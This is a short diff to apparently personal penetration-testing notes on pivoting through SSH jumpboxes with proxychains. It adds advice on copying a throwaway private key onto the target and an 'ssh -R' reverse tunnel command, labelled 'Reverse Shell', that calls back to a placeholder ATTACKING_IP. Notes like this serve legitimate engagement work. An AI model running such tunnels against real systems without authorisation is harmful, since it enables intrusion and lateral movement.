@@ -121,6 +121,15 @@ proxychains4 -f ~/new-proxychains.conf ssh jumpbox2.local
 ```
 
 
-```
+>[! bug] Important
+As we can't do a forward proxy through ssh to jumpbox1
+
+The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.
+
+Reverse Shell
 
 ```
+ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+```
+
+
